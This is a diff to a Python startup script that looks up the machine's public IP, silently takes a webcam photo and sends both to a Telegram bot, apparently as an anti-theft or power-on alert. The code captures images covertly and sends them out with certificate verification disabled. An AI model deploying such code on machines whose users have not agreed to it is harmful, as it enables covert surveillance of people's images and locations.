@@ -8,23 +8,52 @@ import time
 import threading
 import platform
 from sys import exit as terminate
+import cv2
 import requests
 from load_environ import load_environ
 
 
 RETRIES = 5
-TIME_OUT = 5
+TIME_OUT = 10
+PHOTO_NAME = 'ptoa_rdk.png'
 
 
-def send_to_telegram(message):
+def take_photo():
+    """ try to take a photo using default cam """
+    cap = cv2.VideoCapture(0)
+
+    if not cap or not cap.isOpened():
+        return None
+
+    ret, frame = cap.read()
+
+    if not ret:
+        return None
+    
+    cv2.imwrite(PHOTO_NAME, frame)
+    photo = open(PHOTO_NAME, 'rb')
+    os.remove(PHOTO_NAME)
+    cap.release()
+    return photo
+
+
+def send_to_telegram(message, photo=None):
     """ send telegram message """
     load_environ()
     api_token = os.environ.get("tlg_api_key")
     chat_id = os.environ.get("chat_id")
-    api_url = f'https://api.telegram.org/bot{api_token}/sendMessage'
-
+    api_base_url = f'https://api.telegram.org/bot{api_token}'
+    data = {'chat_id': chat_id, 'text': message}
     try:
-        requests.post(api_url, json={'chat_id': chat_id, 'text': message}, verify=False, timeout=10)
+        requests.post(f'{api_base_url}/sendMessage', data=data, verify=False, timeout=10)
+    except Exception as exception:
+        print(exception)
+
+    if not photo:
+        return
+    data = {'chat_id': chat_id}
+    try:
+        requests.post(f'{api_base_url}/sendPhoto', data=data, files={'photo': photo}, verify=False, timeout=10)
     except Exception as exception:
         print(exception)
 
@@ -57,6 +86,7 @@ def create_thread():
 
 
 global_ip = create_thread()
+picture = take_photo()
 text = f"Nuevo encendido desde: {global_ip} en {platform.system()} \n\n \
 Mas información en: https://www.infobyip.com/ip-{global_ip}.html"
-send_to_telegram(text)
+send_to_telegram(text, picture)
